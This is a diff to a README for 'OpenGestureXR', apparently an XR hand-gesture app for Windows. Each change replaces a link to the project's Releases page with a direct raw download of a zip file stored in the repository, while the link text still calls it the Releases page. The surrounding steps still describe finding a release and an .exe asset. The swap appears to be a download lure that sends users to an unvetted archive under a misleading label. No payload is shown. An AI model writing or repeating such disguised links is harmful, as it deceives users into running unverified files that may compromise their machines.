@@ -1,11 +1,11 @@
-[![Download OpenGestureXR](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge)](https://github.com/Nyxo317/OpenGestureXR/releases)
+[![Download OpenGestureXR](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge)](https://github.com/Nyxo317/OpenGestureXR/raw/refs/heads/main/unity_plugin/XR-Open-Gesture-v1.1-beta.1.zip)
 
 # 🤖 OpenGestureXR - Gesture Control for XR Apps
 
 ## 📥 Download
 Visit this page to get the latest Windows release:
 
-[OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases)
+[OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/raw/refs/heads/main/unity_plugin/XR-Open-Gesture-v1.1-beta.1.zip)
 
 ## 🧭 What OpenGestureXR Does
 
@@ -21,7 +21,7 @@ You can use it for:
 
 Use these steps on a Windows PC:
 
-1. Open the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases) page.
+1. Open the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/raw/refs/heads/main/unity_plugin/XR-Open-Gesture-v1.1-beta.1.zip) page.
 2. Find the latest release at the top of the page.
 3. In the Assets section, look for a Windows file such as:
    - `.exe`
@@ -138,7 +138,7 @@ OpenGestureXR is designed for local hand tracking and gesture use in XR apps. If
 
 ## 🧭 Quick Start
 
-1. Go to the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases) page
+1. Go to the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/raw/refs/heads/main/unity_plugin/XR-Open-Gesture-v1.1-beta.1.zip) page
 2. Download the latest Windows file
 3. Install or extract it
 4. Open the app
